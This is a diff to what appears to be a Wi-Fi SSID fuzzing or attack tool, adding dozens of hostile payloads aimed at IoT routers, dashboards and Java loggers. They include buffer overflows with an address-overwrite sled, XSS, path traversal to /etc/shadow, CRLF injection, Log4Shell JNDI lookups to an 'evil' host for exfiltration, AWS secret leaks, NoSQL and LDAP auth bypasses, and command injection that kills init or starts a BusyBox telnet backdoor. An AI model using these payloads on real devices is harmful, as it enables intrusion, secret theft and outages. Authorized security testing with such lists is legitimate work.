@@ -61,9 +61,12 @@ DEFAULT_PAYLOADS = [
     ('\x00|reboot|',         'wifi_cmd',  'Null-prefix command injection'),
 
     # =========================================================================
-    # WIFI SSID — Overflow / Fuzzing (10 payloads)
+    # WIFI SSID — Overflow / Fuzzing (26 payloads)
     # SSID max is 32 bytes per IEEE 802.11 — test parser boundary handling
+    # Includes 64-byte and 128-byte payloads targeting fixed-size buffers
     # =========================================================================
+
+    # --- 32-byte boundary (IEEE 802.11 SSID max) ---
     ('A' * 32,               'wifi_overflow',  '32-byte max SSID fill'),
     ('A' * 31 + '\x00',     'wifi_overflow',  'Null-terminated at boundary'),
     ('\xff' * 32,            'wifi_overflow',  '0xFF fill (invalid UTF-8)'),
@@ -74,6 +77,27 @@ DEFAULT_PAYLOADS = [
     ('\xfe\xff' * 16,        'wifi_overflow',  'BOM-like invalid encoding'),
     ('\x80' * 32,            'wifi_overflow',  'Invalid continuation bytes'),
     ('A' * 31 + '\x7f',     'wifi_overflow',  'DEL char at boundary'),
+
+    # --- 64-byte boundary (common embedded buffer: char ssid[64]) ---
+    ('A' * 64,               'wifi_overflow',  '64-byte buffer fill'),
+    ('A' * 63 + '\x00',     'wifi_overflow',  '64-byte null-terminated boundary'),
+    ('\x7f' * 64,            'wifi_overflow',  '64-byte 0x7F DEL fill'),
+    ('\x00' * 64,            'wifi_overflow',  '64-byte all null bytes'),
+    ('A' * 32 + '\x00' * 32, 'wifi_overflow', '64-byte half-null after SSID max'),
+    ('A' * 33,               'wifi_overflow',  '33-byte off-by-one past SSID max'),
+    ('\x41' * 60 + '\r\n\r\n', 'wifi_overflow', '64-byte CRLF at boundary'),
+    ('A' * 48 + '%n' * 8,   'wifi_overflow',  '64-byte overflow + format write'),
+
+    # --- 128-byte boundary (larger buffers: char buf[128], stack frames) ---
+    ('A' * 128,              'wifi_overflow',  '128-byte buffer fill'),
+    ('A' * 127 + '\x00',    'wifi_overflow',  '128-byte null-terminated boundary'),
+    ('\x7f' * 128,           'wifi_overflow',  '128-byte 0x7F DEL fill'),
+    ('\x00' * 128,           'wifi_overflow',  '128-byte all null bytes'),
+    ('A' * 64 + '\x00' * 64, 'wifi_overflow', '128-byte half-null split'),
+    ('A' * 124 + 'DEAD',    'wifi_overflow',  '128-byte fill + canary marker'),
+    ('\x41' * 120 + '\x01\x02\x03\x04\x7f\x7f\x7f\x7f',
+                             'wifi_overflow',  '128-byte sled + address overwrite'),
+    ('A' * 65,               'wifi_overflow',  '65-byte off-by-one past 64-byte buf'),
 
     # =========================================================================
     # WIFI SSID — Format String (15 payloads)
@@ -182,6 +206,93 @@ DEFAULT_PAYLOADS = [
     ('\x0d\xf0\xad\xba' * 8,        'wifi_heap',  '0xBAADF00D uninitialized mem marker'),
     ('\x41\x41\x41\x41' * 7 + '\xfe\xff\xfe\xff',
                                      'wifi_heap',  'Heap spray + invalid free trigger'),
+
+    # =========================================================================
+    # WIFI SSID — XSS / Web UI Injection (8 payloads)
+    # IoT web dashboards display nearby SSIDs — unsanitized = XSS
+    # Targets: router admin panels, smart home hubs, WiFi survey tools
+    # =========================================================================
+    ('<script>alert(1)</script>',     'wifi_xss',  'Basic reflected XSS in scan results'),
+    ('<img src=x onerror=alert(1)>',  'wifi_xss',  'Event handler XSS via broken image'),
+    ('"><svg onload=alert(1)>',       'wifi_xss',  'Attribute breakout + SVG event XSS'),
+    ('<body onload=alert(1)>',        'wifi_xss',  'Body tag event injection'),
+    ('<details open ontoggle=a()>',   'wifi_xss',  'HTML5 details ontoggle event'),
+    ('<iframe src=//evil.com>',       'wifi_xss',  'iFrame injection in scan UI'),
+    ("'-alert(1)-'",                  'wifi_xss',  'JS string breakout in inline context'),
+    ('<marquee onstart=alert(1)>',    'wifi_xss',  'Marquee event handler XSS'),
+
+    # =========================================================================
+    # WIFI SSID — Path Traversal (6 payloads)
+    # Firmware using SSID in file paths (log storage, config, history)
+    # Targets: embedded Linux IoT storing WiFi scan results on filesystem
+    # =========================================================================
+    ('../../../etc/shadow',           'wifi_path',  'Shadow file traversal'),
+    ('....//....//etc/passwd',        'wifi_path',  'Double-dot filter bypass'),
+    ('..%2f..%2f..%2fetc/pass',      'wifi_path',  'URL-encoded slash traversal'),
+    ('/proc/self/environ',            'wifi_path',  'Process environment leak'),
+    ('../..\\..\\..\\boot.ini',      'wifi_path',  'Mixed separator Windows traversal'),
+    ('/dev/urandom',                  'wifi_path',  'Device file read DoS'),
+
+    # =========================================================================
+    # WIFI SSID — CRLF / HTTP Header Injection (6 payloads)
+    # IoT web interfaces reflecting SSID in HTTP responses without CR/LF strip
+    # Targets: captive portals, router web UIs, IoT dashboards
+    # =========================================================================
+    ('\r\nX-Injected: true',          'wifi_crlf',  'Custom header injection via CRLF'),
+    ('%0d%0aSet-Cookie:a=1',          'wifi_crlf',  'URL-encoded cookie injection'),
+    ('\r\nLocation: //evil',          'wifi_crlf',  'Redirect header injection'),
+    ('%0d%0a%0d%0a<h1>XSS',          'wifi_crlf',  'Response splitting body injection'),
+    ('\nTransfer-Encoding: z',        'wifi_crlf',  'Request smuggling prefix'),
+    ('\r\nContent-Length: 0',         'wifi_crlf',  'Content-Length header injection'),
+
+    # =========================================================================
+    # WIFI SSID — JNDI / Expression Language (6 payloads)
+    # Java-based IoT platforms that log SSIDs (Android, SmartThings, etc.)
+    # Targets: Log4j, Spring EL, Thymeleaf — any Java logger ingesting SSIDs
+    # =========================================================================
+    ('${jndi:ldap://evil/a}',         'wifi_jndi',  'Log4Shell JNDI LDAP lookup'),
+    ('${jndi:dns://evil/a}',          'wifi_jndi',  'JNDI DNS exfiltration'),
+    ('${env:AWS_SECRET_KEY}',         'wifi_jndi',  'Environment variable leak via EL'),
+    ('${sys:user.dir}',               'wifi_jndi',  'System property leak via EL'),
+    ('${jndi:rmi://evil/a}',          'wifi_jndi',  'JNDI RMI class loading'),
+    ('${{<%[%\'"}}%\\.',              'wifi_jndi',  'Polyglot template probe'),
+
+    # =========================================================================
+    # WIFI SSID — NoSQL / LDAP Injection (6 payloads)
+    # IoT devices using MongoDB/CouchDB or LDAP for network storage/auth
+    # Targets: enterprise IoT, network appliances, cloud-connected devices
+    # =========================================================================
+    ('{"$gt":""}',                    'wifi_nosql',  'MongoDB gt operator bypass'),
+    ('{"$ne":null}',                  'wifi_nosql',  'MongoDB not-equal auth bypass'),
+    ('{"$regex":".*"}',               'wifi_nosql',  'MongoDB regex match-all'),
+    ('{"$where":"1==1"}',             'wifi_nosql',  'MongoDB server-side JS eval'),
+    ('*)(uid=*))(|(uid=*',            'wifi_nosql',  'LDAP wildcard filter injection'),
+    ('admin)(|(password=*',           'wifi_nosql',  'LDAP password filter bypass'),
+
+    # =========================================================================
+    # Additions to existing categories — filling gaps
+    # =========================================================================
+
+    # --- Command Injection: Windows/BusyBox/PowerShell targets ---
+    ('& ping -n 3 127.0.0.1 &',      'wifi_cmd',  'Windows cmd ping injection'),
+    ('|powershell -c reboot|',        'wifi_cmd',  'PowerShell command via pipe'),
+    ('`busybox reboot`',              'wifi_cmd',  'BusyBox-specific reboot'),
+    ('$(kill -9 1)',                   'wifi_cmd',  'Kill init process (PID 1)'),
+    ('|/bin/busybox telnetd|',        'wifi_cmd',  'BusyBox telnet backdoor'),
+
+    # --- Serialization: CSV/DDE injection + YAML deserialization ---
+    ('=CMD("reboot")',                'wifi_serial',  'Excel formula command injection'),
+    ('-cmd|\'/C calc\'!A0',           'wifi_serial',  'DDE minus prefix execution'),
+    ('+cmd|\'/C calc\'!A0',           'wifi_serial',  'DDE plus prefix execution'),
+    ('!!python/object/apply:os.system ["reboot"]'[:32],
+                                      'wifi_serial',  'YAML deserialization RCE'),
+    ('O:8:"Obj":1:{s:1:"x";}',       'wifi_serial',  'PHP object deserialization'),
+
+    # --- Probe/Malformed: WiFi stack edge cases ---
+    ('\u202ediSS_derewop',            'wifi_probe',  'RTL override display spoof'),
+    ('DIRECT-xy-FAKEDEVICE',          'wifi_probe',  'WiFi Direct prefix spoof'),
+    ('\xc0\x80' * 16,                 'wifi_probe',  'Overlong null encoding (x16)'),
+    ('\xed\xa0\x80' * 10,             'wifi_probe',  'Lone surrogate codepoints'),
 
 ]
 
